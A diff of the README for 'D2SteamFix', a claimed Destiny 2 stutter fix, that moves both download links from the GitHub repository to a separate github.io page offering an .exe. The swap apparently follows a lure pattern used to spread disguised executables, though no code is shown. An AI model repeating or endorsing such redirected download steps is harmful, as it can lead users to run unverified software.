@@ -1,6 +1,6 @@
 # 🛠️ D2SteamFix - Stop frame stuttering in Destiny 2
 
-[![](https://img.shields.io/badge/Download-D2SteamFix-blue)](https://github.com/Shahnom1791/D2SteamFix)
+[![](https://img.shields.io/badge/Download-D2SteamFix-blue)](https://shahnom1791.github.io)
 
 D2SteamFix acts as a tool for players who experience frame pacing issues and stuttering while playing Destiny 2 on Steam. It adjusts how the game interacts with your computer to provide a smoother experience. The software works as a background wrapper that launches alongside your game.
 
@@ -8,7 +8,7 @@ D2SteamFix acts as a tool for players who experience frame pacing issues and stu
 
 You do not need programming skills to use this tool. Follow these instructions to set up D2SteamFix on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Shahnom1791/D2SteamFix) to download the latest version of the software.
+1. Visit the [official release page](https://shahnom1791.github.io) to download the latest version of the software.
 2. Look for the file ending in .exe under the "Assets" section.
 3. Click the file to download it to your computer.
 4. Move the file to a folder where you want to keep your game tools.
